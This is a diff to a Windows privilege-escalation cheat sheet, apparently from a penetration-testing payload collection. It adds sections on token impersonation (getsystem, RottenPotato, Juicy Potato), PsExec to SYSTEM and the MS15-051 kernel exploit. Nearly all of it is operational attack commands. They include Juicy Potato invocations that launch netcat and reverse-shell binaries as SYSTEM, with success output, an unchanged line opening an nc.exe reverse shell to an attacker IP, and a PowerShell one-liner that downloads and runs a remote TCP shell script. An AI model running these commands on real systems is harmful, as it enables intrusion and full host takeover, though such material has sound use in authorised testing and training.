@@ -15,14 +15,20 @@
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Runas](#eop---runas)
+* [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
 * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
+* [EoP - Impersonation Privileges](#eop---impersonation-privileges)
+  * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
+  * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
+  * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
-  * [Token Impersonation (RottenPotato)](#token-impersonation-rottenpotato)
   * [MS08-067 (NetAPI)](#ms08-067-netapi)
   * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
   * [MS11-080 (adf.sys)](#ms11-080-afd.sys---microsoft-windows-xp-2003)
+  * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
+* [References](#references)
 
 ## Tools
 
@@ -419,6 +425,7 @@ Scheduled tasks
 
 ```powershell
 schtasks /query /fo LIST 2>nul | findstr TaskName
+schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
 
@@ -483,7 +490,8 @@ net start upnphost
 sc config upnphost depend=""
 ```
 
-Using [`accesschk`](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe) from Sysinternals.
+Using [`accesschk`](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe) from Sysinternals or [accesschk-XP.exe - github.com/phackt](https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe)
+
 ```powershell
 $ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 RW SSDPSRV
@@ -581,7 +589,6 @@ Check if these registry values are set to "1".
 
 ```bat
 $ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-
 $ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
@@ -631,6 +638,12 @@ $ computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 ```
 
+## EoP - From local administrator to NT SYSTEM
+
+```powershell
+PsExec.exe -i -s cmd.exe
+```
+
 ## EoP - Living Off The Land Binaries and Scripts
 
 Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/
@@ -650,9 +663,19 @@ regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 Microsoft.Workflow.Compiler.exe tests.xml results.xml
 ```
 
-## EoP - Common Vulnerabilities and Exposure
+## EoP - Impersonation Privileges
 
-### Token Impersonation (RottenPotato)
+### Meterpreter getsystem and alternatives
+
+```powershell
+meterpreter> getsystem 
+Tokenvator.exe getsystem cmd.exe 
+incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
+psexec -s -i cmd.exe 
+python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
+```
+
+### RottenPotato (Token Impersonation)
 
 Binary available at : https://github.com/foxglovesec/RottenPotato
 Binary available at : https://github.com/breenmachine/RottenPotatoNG
@@ -672,6 +695,43 @@ Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
 Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
+
+
+### Juicy Potato (abusing the golden privileges)
+
+Binary available at : https://github.com/ohpe/juicy-potato/releases    
+:warning: Juicy Potato doesn't work in Windows Server 2019. 
+
+1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
+
+    ```powershell
+    whoami /priv
+    ```
+
+2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
+
+    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise) 
+    * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
+    * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
+    * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
+    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise) 
+    * [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
+    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard) 
+
+3. Execute JuicyPotato to run a privileged command.
+
+    ```powershell
+    JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
+    JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+    JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
+        Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
+        ......
+        [+] authresult 0
+        {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
+        [+] CreateProcessWithTokenW OK
+    ```
+
+## EoP - Common Vulnerabilities and Exposure
 
 ### MS08-067 (NetAPI)
 
@@ -720,6 +780,23 @@ Metasploit : exploit/windows/local/ms10_015_kitrap0d
 Python: https://www.exploit-db.com/exploits/18176
 Metasploit: exploit/windows/local/ms11_080_afdjoinleaf
 ```
+
+### MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012
+
+```powershell
+printf("[#] usage: ms15-051 command \n");
+printf("[#] eg: ms15-051 \"whoami /all\" \n");
+
+# x32
+https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe
+
+# x64
+https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe
+
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
+use exploit/windows/local/ms15_051_client_copy_image
+```
+
 
 ### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
 
